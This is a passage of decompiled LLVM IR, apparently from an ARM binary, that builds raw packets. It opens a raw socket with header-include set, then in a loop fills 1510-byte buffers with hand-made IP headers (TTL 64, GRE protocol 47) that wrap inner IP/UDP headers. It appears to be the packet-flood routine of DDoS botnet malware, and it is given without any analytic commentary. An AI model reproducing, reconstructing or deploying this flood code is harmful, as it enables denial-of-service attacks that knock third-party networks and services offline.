  store i32 %arg4, i32* @r5, align 4
  %v1_b6a4 = urem i32 %arg3, 256
  store i32 %v1_b6a4, i32* @r4, align 4
  %v2_b6a8 = call i32 @_calloc(i32 %v1_b68c, i32 4)
  %v0_b6ac = load i32, i32* @r5, align 4
  store i32 %v0_b6ac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b6bc = load i32, i32* @r4, align 4
  store i32 %v0_b6bc, i32* %r0.global-to-local, align 4
  %v5_b6c0 = inttoptr i32 %v0_b6ac to i32*
  %v6_b6c0 = call i32 @function_b240(i32 %v0_b6bc, i32* %v5_b6c0, i32 2, i32 0)
  %v1_b6cc = urem i32 %v6_b6c0, 256
  store i32 %v1_b6cc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b6d8 = load i32, i32* @r5, align 4
  store i32 %v0_b6d8, i32* %r1.global-to-local, align 4
  %v0_b6dc = load i32, i32* @r4, align 4
  store i32 %v0_b6dc, i32* %r0.global-to-local, align 4
  %v5_b6e0 = trunc i32 %v6_b6c0 to i8
  %v6_b6e4 = inttoptr i32 %v0_b6d8 to i32*
  %v7_b6e4 = call i32 @function_b240(i32 %v0_b6dc, i32* %v6_b6e4, i32 3, i32 65535)
  %v0_b6e8 = load i32, i32* @r5, align 4
  store i32 %v0_b6e8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b6e4, i32* @r7, align 4
  %v0_b6f8 = load i32, i32* @r4, align 4
  store i32 %v0_b6f8, i32* %r0.global-to-local, align 4
  %v4_b6fc = inttoptr i32 %v0_b6e8 to i32*
  %v5_b6fc = call i32 @function_b240(i32 %v0_b6f8, i32* %v4_b6fc, i32 4, i32 64)
  %v1_b704 = urem i32 %v5_b6fc, 256
  store i32 %v1_b704, i32* %ip.global-to-local, align 4
  %v0_b708 = load i32, i32* @r5, align 4
  store i32 %v0_b708, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b714 = load i32, i32* @r4, align 4
  store i32 %v0_b714, i32* %r0.global-to-local, align 4
  %v5_b718 = trunc i32 %v5_b6fc to i8
  %v6_b71c = inttoptr i32 %v0_b708 to i32*
  %v7_b71c = call i32 @function_b240(i32 %v0_b714, i32* %v6_b71c, i32 5, i32 1)
  %v1_b728 = urem i32 %v7_b71c, 256
  store i32 %v1_b728, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b734 = load i32, i32* @r5, align 4
  store i32 %v0_b734, i32* %r1.global-to-local, align 4
  %v0_b738 = load i32, i32* @r4, align 4
  store i32 %v0_b738, i32* %r0.global-to-local, align 4
  %v5_b740 = inttoptr i32 %v0_b734 to i32*
  %v6_b740 = call i32 @function_b240(i32 %v0_b738, i32* %v5_b740, i32 6, i32 65535)
  %v0_b748 = load i32, i32* @r5, align 4
  store i32 %v0_b748, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b740, i32* @sl, align 4
  %v0_b758 = load i32, i32* @r4, align 4
  store i32 %v0_b758, i32* %r0.global-to-local, align 4
  %v4_b75c = inttoptr i32 %v0_b748 to i32*
  %v5_b75c = call i32 @function_b240(i32 %v0_b758, i32* %v4_b75c, i32 7, i32 65535)
  %v0_b760 = load i32, i32* @r5, align 4
  store i32 %v0_b760, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_b75c, i32* @r8, align 4
  %v0_b770 = load i32, i32* @r4, align 4
  store i32 %v0_b770, i32* %r0.global-to-local, align 4
  %v4_b774 = inttoptr i32 %v0_b760 to i32*
  %v5_b774 = call i32 @function_b240(i32 %v0_b770, i32* %v4_b774, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b784 = load i32, i32* @r5, align 4
  store i32 %v0_b784, i32* %r1.global-to-local, align 4
  %v0_b788 = load i32, i32* @r4, align 4
  store i32 %v0_b788, i32* %r0.global-to-local, align 4
  %v4_b78c = inttoptr i32 %v0_b784 to i32*
  %v5_b78c = call i32 @function_b240(i32 %v0_b788, i32* %v4_b78c, i32 1, i32 1)
  %v1_b794 = urem i32 %v5_b78c, 256
  store i32 %v1_b794, i32* %ip.global-to-local, align 4
  %v0_b798 = load i32, i32* @r5, align 4
  store i32 %v0_b798, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b7a4 = load i32, i32* @r4, align 4
  store i32 %v0_b7a4, i32* %r0.global-to-local, align 4
  %v5_b7ac = inttoptr i32 %v0_b798 to i32*
  %v6_b7ac = call i32 @function_b240(i32 %v0_b7a4, i32* %v5_b7ac, i32 19, i32 0)
  %v0_b7b4 = load i32, i32* @r5, align 4
  store i32 %v0_b7b4, i32* %r1.global-to-local, align 4
  %v2_b7b8 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_b7b8, i32* %r3.global-to-local, align 4
  store i32 %v6_b7ac, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b7c4 = load i32, i32* @r4, align 4
  store i32 %v0_b7c4, i32* %r0.global-to-local, align 4
  %v4_b7c8 = inttoptr i32 %v0_b7b4 to i32*
  %v5_b7c8 = call i32 @function_b240(i32 %v0_b7c4, i32* %v4_b7c8, i32 25, i32 %v2_b7b8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b7dc = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_b7dc, i32* %r0.global-to-local, align 4
  %v7_b7e0 = icmp eq i32 %v3_b7dc, -1
  store i1 %v7_b7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b7e0, label %dec_label_pc_bcc4, label %dec_label_pc_b7ec

dec_label_pc_b7ec:                                ; preds = %dec_label_pc_b688
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b7f4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b7f4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b808 = call i32 @_setsockopt(i32 %v3_b7dc, i32 0, i32 3, i32 %v6_b7f4, i32 4)
  store i32 %v5_b808, i32* %r0.global-to-local, align 4
  %v7_b80c = icmp eq i32 %v5_b808, -1
  store i1 %v7_b80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b80c, label %dec_label_pc_bcbc, label %dec_label_pc_b814

dec_label_pc_b814:                                ; preds = %dec_label_pc_b7ec
  %v0_b814 = load i32, i32* @sl, align 4
  %v3_b814 = mul i32 %v0_b814, 65536
  store i32 %v3_b814, i32* %sl.global-to-local, align 4
  %v0_b818 = load i32, i32* @r8, align 4
  %v3_b818 = mul i32 %v0_b818, 65536
  store i32 %v3_b818, i32* %r8.global-to-local, align 4
  %v0_b820 = load i32, i32* @r7, align 4
  %v3_b820 = mul i32 %v0_b820, 65536
  store i32 %v3_b820, i32* %r7.global-to-local, align 4
  %v0_b824 = load i32, i32* @r6, align 4
  %v1_b824 = urem i32 %v0_b824, 256
  store i32 %v1_b824, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_b82c = urem i32 %v0_b820, 65536
  store i32 %v3_b82c, i32* %r2.global-to-local, align 4
  %v3_b830 = urem i32 %v0_b814, 65536
  store i32 %v3_b830, i32* %r3.global-to-local, align 4
  %v3_b834 = urem i32 %v0_b818, 65536
  store i32 %v3_b834, i32* %r1.global-to-local, align 4
  %v0_b838 = load i32, i32* @fp, align 4
  %v2_b838 = icmp eq i32 %v0_b838, 0
  store i1 %v2_b838, i1* %cpsr_z.global-to-local, align 1
  %tmp85 = icmp slt i32 %v0_b838, 1
  br i1 %tmp85, label %dec_label_pc_bde4, label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b814
  %v3_b85c = mul i32 %v5_b774, 65536
  %v0_b820.not = or i32 %v0_b820, -65536
  %v1_b864 = xor i32 %v0_b820.not, 65535
  %v1_b86c = add i32 %v3_b85c, 4325376
  %v1_b870 = urem i32 %v0_b814, 256
  %v3_b878 = udiv i32 %v1_b86c, 256
  %v1_b87c = add i32 %v3_b85c, 524288
  %v1_b884 = add i32 %v3_b85c, 1835008
  %v1_b888 = urem i32 %v0_b818, 256
  %v1_b88c = and i32 %v3_b878, 65280
  store i32 %v1_b88c, i32* %r0.global-to-local, align 4
  %v3_b894 = udiv i32 %v1_b884, 256
  %tmp86 = mul nsw i32 %v1_b864, 256
  %v1_b8ac = and i32 %v3_b894, 65280
  store i32 %v1_b8ac, i32* %ip.global-to-local, align 4
  %v1_b8b0 = and i32 %tmp86, 65280
  store i32 %v1_b8b0, i32* %lr.global-to-local, align 4
  %tmp88 = udiv i32 %v1_b864, 256
  %v4_b89c = sdiv i32 %v1_b86c, 16777216
  %v5_b8cc = trunc i32 %tmp88 to i8
  %v3_b8d8 = mul nuw nsw i32 %v1_b870, 256
  %v3_b8e0 = ashr i32 %v1_b86c, 31
  %v3_b8e4 = mul nuw nsw i32 %v1_b888, 256
  store i32 %v3_b8e4, i32* %r5.global-to-local, align 4
  %tmp89 = udiv i32 %v0_b814, 256
  %v4_b8e8 = urem i32 %tmp89, 256
  %v5_b8e8 = or i32 %v4_b8e8, %v3_b8d8
  store i32 %v5_b8e8, i32* %r7.global-to-local, align 4
  %v3_b8ec = udiv i32 %v1_b87c, 256
  %tmp90 = udiv i32 %v0_b818, 256
  %v4_b8f0 = urem i32 %tmp90, 256
  %v5_b8f0 = or i32 %v4_b8f0, %v3_b8e4
  store i32 %v5_b8f0, i32* %sl.global-to-local, align 4
  %v3_b8fc = sdiv i32 %v3_b820, 16777216
  %v7_b8fc = sdiv i32 %v1_b884, 16777216
  %v1_b900 = and i32 %v3_b8ec, 65280
  store i32 %v1_b900, i32* %r6.global-to-local, align 4
  %v3_b904 = ashr i32 %v3_b820, 31
  %v3_b908 = ashr i32 %v1_b884, 31
  %v3_b90c = udiv i32 %v1_b864, 65536
  %v4_b910 = udiv i32 %v1_b87c, 16777216
  %v5_b910 = or i32 %v4_b910, %v1_b900
  store i32 %v5_b910, i32* %r8.global-to-local, align 4
  store i32 %v1_b870, i32* %r1.global-to-local, align 4
  store i32 %v1_b888, i32* %r2.global-to-local, align 4
  %v3_b92837 = udiv i32 %v1_b900, 256
  store i32 %v3_b92837, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_b988 = sext i8 %v5_b718 to i32
  %v2_ba88 = icmp eq i32 %v1_b824, 0
  %sext17 = mul i32 %v0_b814, 16777216
  %v4_ba9c = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v1_b87c, 256
  %v4_bab0 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_b818, 16777216
  %v4_bab8 = sdiv i32 %sext19, 16777216
  %v1_b99c = trunc i32 %v3_b8e0 to i8
  %v1_bac0 = trunc i32 %v4_bab0 to i8
  br label %dec_label_pc_b93c

dec_label_pc_b93c:                                ; preds = %bb97, %dec_label_pc_b858
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b948 = call i32 @_calloc(i32 1510, i32 4)
  store i32 %v2_b948, i32* %r0.global-to-local, align 4
  store i32 %v2_b6a8, i32* %r1.global-to-local, align 4
  %v3_b950 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b950, i32* %r3.global-to-local, align 4
  %v2_b954 = load i32, i32* %r4.global-to-local, align 4
  %v5_b954 = mul i32 %v2_b954, 4
  %v6_b954 = add i32 %v5_b954, %v2_b6a8
  %v7_b954 = inttoptr i32 %v6_b954 to i32*
  store i32 %v2_b948, i32* %v7_b954, align 4
  %v0_b958 = load i32, i32* %r1.global-to-local, align 4
  %v1_b958 = load i32, i32* %r3.global-to-local, align 4
  %v4_b958 = mul i32 %v1_b958, 4
  %v5_b958 = add i32 %v4_b958, %v0_b958
  %v6_b958 = inttoptr i32 %v5_b958 to i32*
  %v7_b958 = load i32, i32* %v6_b958, align 4
  store i32 %v7_b958, i32* %r4.global-to-local, align 4
  %v1_b95c = inttoptr i32 %v7_b958 to i8*
  %v2_b95c = load i8, i8* %v1_b95c, align 1
  %tmp = urem i8 %v2_b95c, 16
  %v1_b960 = zext i8 %tmp to i32
  %v1_b964 = or i32 %v1_b960, 64
  store i32 %v1_b964, i32* %r2.global-to-local, align 4
  %v1_b968 = trunc i32 %v1_b964 to i8
  store i8 %v1_b968, i8* %v1_b95c, align 1
  %v0_b96c = load i32, i32* %r4.global-to-local, align 4
  %v1_b96c = inttoptr i32 %v0_b96c to i8*
  %v2_b96c = load i8, i8* %v1_b96c, align 1
  %v1_b970 = and i8 %v2_b96c, -16
  %v1_b974 = or i8 %v1_b970, 5
  store i32 %v1_b728, i32* %r2.global-to-local, align 4
  store i8 %v1_b974, i8* %v1_b96c, align 1
  %v2_b984 = load i32, i32* %r4.global-to-local, align 4
  %v3_b984 = add i32 %v2_b984, 1
  %v4_b984 = inttoptr i32 %v3_b984 to i8*
  store i8 %v5_b6e0, i8* %v4_b984, align 1
  store i32 %v4_b988, i32* %r1.global-to-local, align 4
  %v2_b98c = load i32, i32* %r4.global-to-local, align 4
  %v3_b98c = add i32 %v2_b98c, 8
  %v4_b98c = inttoptr i32 %v3_b98c to i8*
  store i8 %v5_b718, i8* %v4_b98c, align 1
  store i32 %v3_b8e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_b998 = load i32, i32* %r2.global-to-local, align 4
  %v9_b998 = icmp eq i32 %v0_b998, 0
  store i1 %v9_b998, i1* %cpsr_z.global-to-local, align 1
  %v2_b99c = load i32, i32* %r4.global-to-local, align 4
  %v3_b99c = add i32 %v2_b99c, 3
  %v4_b99c = inttoptr i32 %v3_b99c to i8*
  store i8 %v1_b99c, i8* %v4_b99c, align 1
  store i32 %v4_b89c, i32* %r2.global-to-local, align 4
  %v0_b9a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b9a4, label %.thread21, label %.thread

.thread:                                          ; preds = %dec_label_pc_b93c
  %v1_b9a4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_b9a4, i32* %r3.global-to-local, align 4
  %v2_b9a8 = trunc i32 %v1_b9a4 to i8
  %v3_b9a8 = load i32, i32* %r4.global-to-local, align 4
  %v4_b9a8 = add i32 %v3_b9a8, 7
  %v5_b9a8 = inttoptr i32 %v4_b9a8 to i8*
  store i8 %v2_b9a8, i8* %v5_b9a8, align 1
  %v0_b9ac.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b9ac.pr.pr, label %.thread21, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b9b0 = load i32, i32* %r4.global-to-local, align 4
  %v4_b9b0 = add i32 %v3_b9b0, 6
  %v5_b9b0 = inttoptr i32 %v4_b9b0 to i8*
  store i8 64, i8* %v5_b9b0, align 1
  br label %.thread21

.thread21:                                        ; preds = %dec_label_pc_b93c, %.thread, %bb
  %v0_b9b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b9b4 = trunc i32 %v0_b9b4 to i8
  %v2_b9b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b9b4 = add i32 %v2_b9b4, 2
  %v4_b9b4 = inttoptr i32 %v3_b9b4 to i8*
  store i8 %v1_b9b4, i8* %v4_b9b4, align 1
  store i32 %v3_b904, i32* %r2.global-to-local, align 4
  store i32 %v3_b8fc, i32* %r1.global-to-local, align 4
  %v2_b9c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b9c4 = add i32 %v2_b9c4, 9
  %v4_b9c4 = inttoptr i32 %v3_b9c4 to i8*
  store i8 47, i8* %v4_b9c4, align 1
  %v0_b9c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b9c8 = trunc i32 %v0_b9c8 to i8
  %v2_b9c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b9c8 = add i32 %v2_b9c8, 5
  %v4_b9c8 = inttoptr i32 %v3_b9c8 to i8*
  store i8 %v1_b9c8, i8* %v4_b9c8, align 1
  %v3_b9cc = load i32, i32* %stack_var_-40, align 4
  %v5_b9d4 = mul i32 %v3_b9cc, 24
  store i32 %v5_b9d4, i32* %r3.global-to-local, align 4
  store i32 %v5_b7c8, i32* %r2.global-to-local, align 4
  %v1_b9dc = load i32, i32* %r4.global-to-local, align 4
  %v2_b9dc = add i32 %v1_b9dc, 12
  %v3_b9dc = inttoptr i32 %v2_b9dc to i32*
  store i32 %v5_b7c8, i32* %v3_b9dc, align 4
  %v0_b9e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9e0 = load i32, i32* @sb, align 4
  %v2_b9e0 = add i32 %v1_b9e0, %v0_b9e0
  store i32 %v2_b9e0, i32* %r3.global-to-local, align 4
  %v1_b9e4 = add i32 %v2_b9e0, 16
  %v2_b9e4 = inttoptr i32 %v1_b9e4 to i32*
  %v3_b9e4 = load i32, i32* %v2_b9e4, align 4
  store i32 %v3_b9e4, i32* %r2.global-to-local, align 4
  %v0_b9e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b9e8 = trunc i32 %v0_b9e8 to i8
  %v2_b9e8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b9e8 = add i32 %v2_b9e8, 4
  %v4_b9e8 = inttoptr i32 %v3_b9e8 to i8*
  store i8 %v1_b9e8, i8* %v4_b9e8, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_b9f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b9f0 = add i32 %v0_b9f0, 20
  store i32 %v1_b9f0, i32* %r1.global-to-local, align 4
  %v3_b9f4 = add i32 %v0_b9f0, 22
  %v4_b9f4 = inttoptr i32 %v3_b9f4 to i8*
  store i8 101, i8* %v4_b9f4, align 1
  %v0_b9f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b9f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_b9f8 = add i32 %v1_b9f8, 16
  %v3_b9f8 = inttoptr i32 %v2_b9f8 to i32*
  store i32 %v0_b9f8, i32* %v3_b9f8, align 4
  %v0_b9fc = load i32, i32* %r4.global-to-local, align 4
  %v1_b9fc = add i32 %v0_b9fc, 24
  store i32 %v1_b9fc, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_ba04 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba04 = add i32 %v0_ba04, -93
  store i32 %v1_ba04, i32* %r3.global-to-local, align 4
  %v2_ba08 = load i32, i32* %r1.global-to-local, align 4
  %v3_ba08 = add i32 %v2_ba08, 3
  %v4_ba08 = inttoptr i32 %v3_ba08 to i8*
  store i8 88, i8* %v4_ba08, align 1
  %v0_ba0c = load i32, i32* %r3.global-to-local, align 4
  %v1_ba0c = trunc i32 %v0_ba0c to i8
  %v2_ba0c = load i32, i32* %r0.global-to-local, align 4
  %v3_ba0c = add i32 %v2_ba0c, 12
  %v4_ba0c = inttoptr i32 %v3_ba0c to i8*
  store i8 %v1_ba0c, i8* %v4_ba0c, align 1
  %v0_ba10 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba10 = trunc i32 %v0_ba10 to i8
  %v2_ba10 = load i32, i32* %r0.global-to-local, align 4
  %v3_ba10 = add i32 %v2_ba10, 13
  %v4_ba10 = inttoptr i32 %v3_ba10 to i8*
  store i8 %v1_ba10, i8* %v4_ba10, align 1
  %v0_ba14 = load i32, i32* %r4.global-to-local, align 4
  %v1_ba14 = add i32 %v0_ba14, 38
  %v2_ba14 = inttoptr i32 %v1_ba14 to i8*
  %v3_ba14 = load i8, i8* %v2_ba14, align 1
  %tmp102 = urem i8 %v3_ba14, 16
  %v1_ba18 = zext i8 %tmp102 to i32
  %v1_ba1c = or i32 %v1_ba18, 64
  store i32 %v1_ba1c, i32* %r3.global-to-local, align 4
  %v1_ba20 = trunc i32 %v1_ba1c to i8
  store i8 %v1_ba20, i8* %v2_ba14, align 1
  %v0_ba24 = load i32, i32* %r4.global-to-local, align 4
  %v1_ba24 = add i32 %v0_ba24, 38
  %v2_ba24 = inttoptr i32 %v1_ba24 to i8*
  %v3_ba24 = load i8, i8* %v2_ba24, align 1
  %v1_ba28 = and i8 %v3_ba24, -16
  %v1_ba2c = or i8 %v1_ba28, 5
  store i8 %v1_ba2c, i8* %v2_ba24, align 1
  %v0_ba38 = load i32, i32* %r4.global-to-local, align 4
  %v1_ba38 = add i32 %v0_ba38, 38
  store i32 %v1_ba38, i32* %r5.global-to-local, align 4
  %v3_ba3c = add i32 %v0_ba38, 39
  %v4_ba3c = inttoptr i32 %v3_ba3c to i8*
  store i8 %v5_b6e0, i8* %v4_ba3c, align 1
  store i32 %v7_b8fc, i32* %r1.global-to-local, align 4
  store i32 %tmp88, i32* %r3.global-to-local, align 4
  store i32 %v3_b908, i32* %r2.global-to-local, align 4
  %v2_ba4c = load i32, i32* %r5.global-to-local, align 4
  %v3_ba4c = add i32 %v2_ba4c, 4
  %v4_ba4c = inttoptr i32 %v3_ba4c to i8*
  store i8 %v5_b8cc, i8* %v4_ba4c, align 1
  %v0_ba50 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba50 = trunc i32 %v0_ba50 to i8
  %v2_ba50 = load i32, i32* %r5.global-to-local, align 4
  %v3_ba50 = add i32 %v2_ba50, 2
  %v4_ba50 = inttoptr i32 %v3_ba50 to i8*
  store i8 %v1_ba50, i8* %v4_ba50, align 1
  %v0_ba54 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ba54, label %bb92, label %bb91

bb91:                                             ; preds = %.thread21
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %.thread21, %bb91
  store i32 %v3_b90c, i32* %r1.global-to-local, align 4
  %v0_ba5c = load i32, i32* %r2.global-to-local, align 4
  %v1_ba5c = trunc i32 %v0_ba5c to i8
  %v2_ba5c = load i32, i32* %r5.global-to-local, align 4
  %v3_ba5c = add i32 %v2_ba5c, 3
  %v4_ba5c = inttoptr i32 %v3_ba5c to i8*
  store i8 %v1_ba5c, i8* %v4_ba5c, align 1
  store i32 %v4_b988, i32* %r2.global-to-local, align 4
  %v0_ba64 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ba64, label %bb94, label %bb93

bb93:                                             ; preds = %bb92
  %v1_ba64 = load i32, i32* %r3.global-to-local, align 4
  %v2_ba64 = trunc i32 %v1_ba64 to i8
  %v3_ba64 = load i32, i32* %r5.global-to-local, align 4
  %v4_ba64 = add i32 %v3_ba64, 6
  %v5_ba64 = inttoptr i32 %v4_ba64 to i8*
  store i8 %v2_ba64, i8* %v5_ba64, align 1
  br label %bb94

bb94:                                             ; preds = %bb92, %bb93
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_ba6c = load i32, i32* %r1.global-to-local, align 4
  %v1_ba6c = trunc i32 %v0_ba6c to i8
  %v2_ba6c = load i32, i32* %r5.global-to-local, align 4
  %v3_ba6c = add i32 %v2_ba6c, 5
  %v4_ba6c = inttoptr i32 %v3_ba6c to i8*
  store i8 %v1_ba6c, i8* %v4_ba6c, align 1
  %v0_ba70 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba70 = trunc i32 %v0_ba70 to i8
  %v2_ba70 = load i32, i32* %r5.global-to-local, align 4
  %v3_ba70 = add i32 %v2_ba70, 8
  %v4_ba70 = inttoptr i32 %v3_ba70 to i8*
  store i8 %v1_ba70, i8* %v4_ba70, align 1
  %v0_ba74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ba74, label %bb96, label %bb95

bb95:                                             ; preds = %bb94
  %v1_ba74 = load i32, i32* %ip.global-to-local, align 4
  %v2_ba74 = trunc i32 %v1_ba74 to i8
  %v3_ba74 = load i32, i32* %r5.global-to-local, align 4
  %v4_ba74 = add i32 %v3_ba74, 7
  %v5_ba74 = inttoptr i32 %v4_ba74 to i8*
  store i8 %v2_ba74, i8* %v5_ba74, align 1
  br label %bb96

bb96:                                             ; preds = %bb94, %bb95
  %v0_ba78 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba78 = trunc i32 %v0_ba78 to i8
  %v2_ba78 = load i32, i32* %r5.global-to-local, align 4
  %v3_ba78 = add i32 %v2_ba78, 9
  %v4_ba78 = inttoptr i32 %v3_ba78 to i8*
  store i8 %v1_ba78, i8* %v4_ba78, align 1
  %v0_ba7c = call i32 @function_117dc()
  store i32 %v0_ba7c, i32* %r0.global-to-local, align 4
  store i32 %v1_b824, i32* %r1.global-to-local, align 4
  store i1 %v2_ba88, i1* %cpsr_z.global-to-local, align 1
  %v1_ba8c = sub i32 1023, %v0_ba7c
  store i32 %v1_ba8c, i32* %r3.global-to-local, align 4
  br i1 %v2_ba88, label %.thread22, label %.thread23

.thread22:                                        ; preds = %bb96
  %v2_ba94 = load i32, i32* %r5.global-to-local, align 4
  %v3_ba94 = add i32 %v2_ba94, 16
  %v4_ba94 = inttoptr i32 %v3_ba94 to i32*
  store i32 %v1_ba8c, i32* %v4_ba94, align 4
  br label %bb97

.thread23:                                        ; preds = %bb96
  %v1_ba90 = load i32, i32* %r4.global-to-local, align 4
  %v2_ba90 = add i32 %v1_ba90, 16
  %v3_ba90 = inttoptr i32 %v2_ba90 to i32*
  %v4_ba90 = load i32, i32* %v3_ba90, align 4
  store i32 %v4_ba90, i32* %r3.global-to-local, align 4
  %v2_ba98 = load i32, i32* %r5.global-to-local, align 4
  %v3_ba98 = add i32 %v2_ba98, 16
  %v4_ba98 = inttoptr i32 %v3_ba98 to i32*
  store i32 %v4_ba90, i32* %v4_ba98, align 4
  br label %bb97

bb97:                                             ; preds = %.thread22, %.thread23
  store i32 %v4_ba9c, i32* %r3.global-to-local, align 4
  %v0_baa0 = load i32, i32* %r4.global-to-local, align 4
  %v1_baa0 = add i32 %v0_baa0, 58
  store i32 %v1_baa0, i32* %r6.global-to-local, align 4
  %v1_baa4 = load i32, i32* %r5.global-to-local, align 4
  %v2_baa4 = add i32 %v1_baa4, 12
  %v3_baa4 = inttoptr i32 %v2_baa4 to i32*
  store i32 %v0_ba7c, i32* %v3_baa4, align 4
  %v0_baa8 = load i32, i32* %r3.global-to-local, align 4
  %v1_baa8 = trunc i32 %v0_baa8 to i8
  %v2_baa8 = load i32, i32* %r6.global-to-local, align 4
  %v3_baa8 = add i32 %v2_baa8, 1
  %v4_baa8 = inttoptr i32 %v3_baa8 to i8*
  store i8 %v1_baa8, i8* %v4_baa8, align 1
  %v3_baac = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_baac, i32* %r3.global-to-local, align 4
  store i32 %v4_bab0, i32* %r2.global-to-local, align 4
  %v1_bab4 = add i32 %v3_baac, 1
  store i32 %v1_bab4, i32* %r4.global-to-local, align 4
  store i32 %v4_bab8, i32* %r1.global-to-local, align 4
  %v1_babc = load i32, i32* @fp, align 4
  %v9_babc = icmp eq i32 %v1_bab4, %v1_babc
  store i1 %v9_babc, i1* %cpsr_z.global-to-local, align 1
  %v2_bac0 = load i32, i32* %r6.global-to-local, align 4
  %v3_bac0 = add i32 %v2_bac0, 5
  %v4_bac0 = inttoptr i32 %v3_bac0 to i8*
  store i8 %v1_bac0, i8* %v4_bac0, align 1
  %v0_bac4 = load i32, i32* %r7.global-to-local, align 4
  %v1_bac4 = trunc i32 %v0_bac4 to i8
  %v2_bac4 = load i32, i32* %r6.global-to-local, align 4
  %v3_bac4 = inttoptr i32 %v2_bac4 to i8*
  store i8 %v1_bac4, i8* %v3_bac4, align 1
  %v0_bac8 = load i32, i32* %sl.global-to-local, align 4
  %v1_bac8 = trunc i32 %v0_bac8 to i8
  %v2_bac8 = load i32, i32* %r6.global-to-local, align 4
  %v3_bac8 = add i32 %v2_bac8, 2
  %v4_bac8 = inttoptr i32 %v3_bac8 to i8*
  store i8 %v1_bac8, i8* %v4_bac8, align 1
  %v0_bacc = load i32, i32* %r1.global-to-local, align 4
  %v1_bacc = trunc i32 %v0_bacc to i8
  %v2_bacc = load i32, i32* %r6.global-to-local, align 4
  %v3_bacc = add i32 %v2_bacc, 3
  %v4_bacc = inttoptr i32 %v3_bacc to i8*
  store i8 %v1_bacc, i8* %v4_bacc, align 1
  %v0_bad0 = load i32, i32* %r8.global-to-local, align 4
  %v1_bad0 = trunc i32 %v0_bad0 to i8
  %v2_bad0 = load i32, i32* %r6.global-to-local, align 4
  %v3_bad0 = add i32 %v2_bad0, 4
  %v4_bad0 = inttoptr i32 %v3_bad0 to i8*
  store i8 %v1_bad0, i8* %v4_bad0, align 1
  %v0_bad4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bad4, i32* %stack_var_-40, align 4
  %v5_bad8 = icmp slt i32 %v1_bab4, %v1_babc
  br i1 %v5_bad8, label %dec_label_pc_b93c, label %dec_label_pc_badc

dec_label_pc_badc:                                ; preds = %bb97
  %v1_bae4 = add i32 %v5_b774, 8
  store i32 %v1_bae4, i32* %r2.global-to-local, align 4
